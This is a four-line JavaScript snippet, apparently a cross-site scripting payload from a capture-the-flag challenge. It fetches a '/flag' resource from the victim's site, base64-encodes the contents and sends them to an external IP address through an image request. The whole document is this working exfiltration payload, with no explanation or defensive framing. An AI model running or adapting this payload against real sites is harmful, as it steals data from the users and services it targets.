fetch('/flag').then(r=>r.text()).then(d=>{
  var img = new Image();
  img.src = 'http://62.210.214.88:8321/?flag=' + btoa(d);
});
